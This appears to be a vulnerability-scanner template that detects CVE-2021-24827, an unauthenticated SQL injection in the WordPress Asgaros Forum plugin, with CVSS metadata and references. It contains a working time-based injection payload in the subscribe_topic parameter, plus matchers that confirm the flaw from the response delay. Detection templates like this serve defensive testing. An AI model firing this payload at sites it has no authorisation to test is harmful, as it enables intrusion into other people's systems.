id: CVE-2021-24827
info:
  name: WordPress Asgaros Forum <1.15.13 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Asgaros Forum plugin before version 1.15.13 is vulnerable
    to SQL injection, allowing attackers to potentially gain access to sensitive information,
    modify data, and execute unauthorized administrative operations on the affected
    site.
  reference:
  - https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1
  - https://wordpress.org/plugins/asgaros-forum/
  - https://plugins.trac.wordpress.org/changeset/2611560/asgaros-forum
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24827
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24827
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The impact of CVE-2021-24827 can lead to unauthorized access of sensitive
      information, modification of data, and execution of unauthorized administrative
      operations in the context of the affected WordPress site.
    recommendation: It is recommended that all WordPress Asgaros Forum plugin users
      update to version 1.15.13 or later to prevent SQL injection attacks.
  tags: cve2022,wp-plugin,asgaros-forum,unauth,wpscan,cve,wordpress,wp,sqli
requests:
- raw:
  - '@timeout: 15s

    GET /forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6) HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "asgarosforum")
    condition: and
